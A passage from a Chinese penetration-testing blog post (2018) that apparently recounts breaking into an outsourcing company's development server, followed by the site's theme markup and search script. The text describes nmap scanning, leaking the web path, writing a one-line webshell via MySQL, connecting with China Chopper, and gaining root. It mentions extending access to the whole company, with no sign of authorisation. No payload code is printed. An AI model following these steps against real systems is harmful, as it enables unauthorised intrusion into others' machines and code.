+<span itemprop="image" itemscope="" itemtype="http://schema.org/ImageObject"><img itemprop="url image" src="https://kionf.com/article_iamges/hack-note-00100/hack-note-00110.jpg" class="full-image" alt="kionf"><meta itemprop="width" content="auto"><meta itemprop="height" content="auto"></span>
+<figure class="highlight sql"><figcaption><span class="caption">执行sql</span></figcaption><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></div><div class="code"><pre><div class="line"><span class="keyword">select</span> @@hostname;</div><div class="line"></div><div class="line">iZ28zl092zjZ</div></pre></div></div></figure>
+<p>尝试Google下这个特别的hostname，出现了惊喜：</p>
+<span itemprop="image" itemscope="" itemtype="http://schema.org/ImageObject"><img itemprop="url image" src="https://kionf.com/article_iamges/hack-note-00100/hack-note-00111.jpg" class="full-image" alt="kionf"><meta itemprop="width" content="auto"><meta itemprop="height" content="auto"></span>
+<p>进一步验证得出网站路径：</p>
+<blockquote>
+<p><code>nmap</code>扫描机器，得出WEB端口访问<code>80</code>端口<code>404</code>，访问443成功出现界面，手测框架爆出Web路径：</p>
+</blockquote>
+<span itemprop="image" itemscope="" itemtype="http://schema.org/ImageObject"><img itemprop="url image" src="https://kionf.com/article_iamges/hack-note-00100/hack-note-00112.kpg" class="full-image" alt="kionf"><meta itemprop="width" content="auto"><meta itemprop="height" content="auto"></span>
+<p>通过Mysql写入一句话，菜刀连之：</p>
+<span itemprop="image" itemscope="" itemtype="http://schema.org/ImageObject"><img itemprop="url image" src="https://kionf.com/article_iamges/hack-note-00100/hack-note-00113.jpg" class="full-image" alt="kionf"><meta itemprop="width" content="auto"><meta itemprop="height" content="auto"></span>
+<p>root启动的nginx，权限就不用说了，根据获取信息Google此公司title，得知是一个软件外包公司，<code>114.215</code>此台机器应该为内部开发测试机器。而且此机器安装有SVN，<code>wwwroot</code>目录下放置的代码是外包的项目代码，继续延伸渗透应该会拿下整个外包公司所有机器的权限。刚刚去卫生间头突然晕了一下，差点摔倒。我现在慌的一批 身体重要不弄了。</p>
+<h1 id="0x03-成果："><a href="#0x03-成果：" class="headerlink" title="0x03 成果："></a>0x03 成果：</h1><span itemprop="image" itemscope="" itemtype="http://schema.org/ImageObject"><img itemprop="url image" src="https://kionf.com/article_iamges/hack-note-00100/hack-note-00114.jpg" class="full-image" alt="kionf"><meta itemprop="width" content="auto"><meta itemprop="height" content="auto"></span>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+  <ul class="post-copyright">
+    <li class="post-copyright-author">
+      <strong>本文作者：</strong>
+      Kionf
+    </li>
+    <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="https://kionf.com/2018/09/11/hack-note-00100/" title="渗透测试小记-由租房引发的惨案">https://kionf.com/2018/09/11/hack-note-00100/</a>
+    </li>
+    <li class="post-copyright-license">
+      <strong>版权声明： </strong>
+      本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
+    </li>
+  </ul>
+
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/渗透测试小记/" rel="tag"># 渗透测试小记</a>
+          
+        </div>
+      
+
+      
+        
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/09/07/linux-tailf/" rel="next" title="tailf 和 tail -f 区别">
+                <i class="fa fa-chevron-left"></i> tailf 和 tail -f 区别
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+      <div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
+          <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+      </div>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/avatar.png"
+               alt="Kionf" />
+          <p class="site-author-name" itemprop="name">Kionf</p>
+           
+              <p class="site-description motion-element" itemprop="description"></p>
+           
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives">
+                <span class="site-state-item-count">33</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-categories">
+              <a href="/categories/index.html">
+                <span class="site-state-item-count">29</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              
+                <span class="site-state-item-count">19</span>
+                <span class="site-state-item-name">标签</span>
+              
+            </div>
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/kalivim" target="_blank" title="GitHub">
+                  
+                    <i class="fa fa-fw fa-github"></i>
+                  
+                  GitHub
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+          <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+            <div class="links-of-blogroll-title">
+              <i class="fa  fa-fw fa-globe"></i>
+              Links
+            </div>
+            <ul class="links-of-blogroll-list">
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://www.freebuf.com/" title="FREEBUF" target="_blank">FREEBUF</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://paper.seebug.org/" title="SecPaper" target="_blank">SecPaper</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://kionf.com/edit/" title="MarkDown" target="_blank">MarkDown</a>
+                </li>
+              
+            </ul>
+          </div>
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x00-信息收集"><span class="nav-text">0x00 信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-ok首先拿到网站后，先打开官网瞅了瞅"><span class="nav-text">1. ok首先拿到网站后，先打开官网瞅了瞅:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-随便输入一个地址："><span class="nav-text">2. 随便输入一个地址：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-在搞个随便输入个404地址"><span class="nav-text">3. 在搞个随便输入个404地址</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-域名分析"><span class="nav-text">4. 域名分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-主机信息"><span class="nav-text">5. 主机信息</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-渗透"><span class="nav-text">0x01 渗透</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-随手一输入带来的惊喜！"><span class="nav-text">1. 随手一输入带来的惊喜！</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-常用Low逼Mysql提权几种方式："><span class="nav-text">2. 常用Low逼Mysql提权几种方式：</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-MOF提权"><span class="nav-text">1) MOF提权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-UDF提权"><span class="nav-text">2) UDF提权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-尝试写入WebShell"><span class="nav-text">3) 尝试写入WebShell</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-进一步渗透"><span class="nav-text">3. 进一步渗透</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-休战"><span class="nav-text">4. 休战</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-千里之堤，溃于蚁穴"><span class="nav-text">0x02 千里之堤，溃于蚁穴</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x03-成果："><span class="nav-text">0x03 成果：</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy;  2014 - 
+  <span itemprop="copyrightYear">2018</span>
+  <span class="with-love" id="heart">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Kionf</span>
+</div>
+
+
+<div class="powered-by">
+  什么样的人才能和时间成为朋友？
+</div>
+
+<div class="theme-info">
+  止于 -
+    源
+  </a>
+</div>
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      
+    </span>
+  
+</div>
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.1"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.1"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.1"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/motto.js"></script>
+
+<script type="text/javascript">
+  new Motto('.title', {
+    lyric: document.querySelector('.title').attributes['data-text'].value,
+    flashSpeed: 200,
+    flashTimeout: 1000
+  });
+</script>
+
+
+  
+
+
+  
+
+    
+      <script id="dsq-count-scr" src="https://kionf-com.disqus.com/count.js" async></script>
+    
+
+    
+      <script type="text/javascript">
+        var disqus_config = function () {
+          this.page.url = 'https://kionf.com/2018/09/11/hack-note-00100/';
+          this.page.identifier = '2018/09/11/hack-note-00100/';
+          this.page.title = '渗透测试小记-由租房引发的惨案';
+        };
+        var d = document, s = d.createElement('script');
+        s.src = 'https://kionf-com.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', '' + +new Date());
+        (d.head || d.body).appendChild(s);
+      </script>
+    
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (search_path.endsWith("json")) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  <script type="text/javascript" src="/js/src/function.js"></script>
+<script type="text/javascript" src="/lib/zclip/clipboard.min.js"></script>	
+<script type="text/javascript" src="/js/src/custom.js"></script>
+<script >
+	$(document).ready(
+	function()
+		{			
+			
+		}
+	);	
+</script>
+
+
+
+</body>
+</html>
